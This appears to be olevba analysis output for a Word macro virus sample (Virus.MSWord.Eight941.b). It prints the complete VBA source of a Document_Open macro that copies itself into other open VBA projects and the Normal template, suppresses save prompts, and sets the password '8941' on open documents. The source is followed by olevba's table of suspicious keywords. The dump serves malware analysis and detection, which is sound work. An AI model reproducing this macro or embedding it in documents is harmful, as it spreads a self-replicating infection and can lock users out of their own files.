olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Eight941.b-8049bc9e32ebc9ba65a556f287a08eeaab603c5c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Eight941.b-8049bc9e32ebc9ba65a556f287a08eeaab603c5c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub Document_Open()
On Error Resume Next
Dim i, j, k As Integer
Dim b, l As Integer

j = -1
For i = 1 To Application.VBE.VBProjects.Count
    If Application.VBE.VBProjects(i).Name = "Normal" Then
        j = i
    End If
    If Not Application.VBE.VBProjects(i).VBComponents(1).codemodule.Find("Document_Open", 1, 1, 1000, 1000) Then
            If j > 0 Then
                If Application.VBE.VBProjects(j).VBComponents(1).codemodule.Find("Document_Open", 1, 1, 1000, 1000) = True Then
                    b = Application.VBE.VBProjects(j).VBComponents(1).codemodule.ProcStartLine("Document_Open", vbext_pk_Proc)
                    l = Application.VBE.VBProjects(j).VBComponents(1).codemodule.ProcCountLines("Document_Open", vbext_pk_Proc)
                    Application.VBE.VBProjects(i).VBComponents(1).codemodule.AddFromString Application.VBE.VBProjects(j).VBComponents(1).codemodule.Lines(b, b + l)
                Else
                    b = Me.VBProject.VBComponents(1).codemodule.ProcStartLine("Document_Open", vbext_pk_Proc)
                    l = Me.VBProject.VBComponents(1).codemodule.ProcCountLines("Document_Open", vbext_pk_Proc)
                    Application.VBE.VBProjects(i).VBComponents(1).codemodule.AddFromString Me.VBProject.VBComponents(1).codemodule.Lines(b, b + l)
                End If
           End If
    End If
    
          
            Options.AllowFastSave = True
            Options.BackgroundSave = True
            Options.CreateBackup = False
            Options.SavePropertiesPrompt = False
            Options.SaveNormalPrompt = False
            Application.Documents(i).Password = "8941"
'            Application.Documents(i).Save
    
Next i


End Sub















+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

